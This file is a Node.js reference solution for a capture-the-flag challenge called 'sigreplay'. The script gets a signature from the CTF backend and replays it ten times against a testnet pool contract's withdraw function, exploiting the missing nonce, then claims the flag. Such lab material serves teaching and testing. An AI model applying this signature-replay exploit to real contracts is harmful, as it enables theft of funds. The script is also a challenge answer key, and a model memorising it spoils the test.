#!/usr/bin/env node
// Reference exploit. Uses ../../../sdk/index.js to wrap the API calls.
//
// Usage:
//   PLAYER_KEY=0x... \
//   POOL=0x...       \
//   BACKEND=https://ctf.example.com  \
//   CHALLENGE=sigreplay              \
//   node solve.js

import { ethers } from "ethers";
import { Ctf } from "../../../sdk/index.js";

const required = ["PLAYER_KEY", "POOL", "BACKEND", "CHALLENGE"];
for (const k of required) {
  if (!process.env[k]) { console.error(`missing env ${k}`); process.exit(1); }
}

const RPC = process.env.RPC_URL ?? "https://ethereum-sepolia-rpc.publicnode.com";
const provider = new ethers.JsonRpcProvider(RPC);
const wallet   = new ethers.Wallet(process.env.PLAYER_KEY, provider);

const me = wallet.address;
const ctf = new Ctf({
  backend: process.env.BACKEND,
  challenge: process.env.CHALLENGE,
  player: me,
});

const pool = new ethers.Contract(process.env.POOL, [
  "function withdraw(address to, uint256 amount, bytes sig)",
  "function AUTHORIZED_AMOUNT() view returns (uint256)",
  "function isSolved(address)  view returns (bool)",
], wallet);

console.log(`player: ${me}`);

// 1. backend mints us a signature
const { signature } = await ctf.getSignature();
console.log(`signature: ${signature.slice(0, 14)}…${signature.slice(-8)}`);

// 2. replay it 10× — no nonce, so it stays valid forever
const amount = await pool.AUTHORIZED_AMOUNT();
let nonce = await wallet.getNonce();
const txs = [];
for (let i = 0; i < 10; i++) {
  console.log(`tx ${i + 1}/10 (nonce ${nonce})`);
  txs.push((await pool.withdraw(me, amount, signature, { nonce })).wait());
  nonce++;
}
await Promise.all(txs);

console.log(`on-chain isSolved: ${await pool.isSolved(me)}`);

// 3. poll /api/flag until the backend confirms
const { flag } = await ctf.claimFlag({ poll: 6 });
console.log(`flag: ${flag}`);
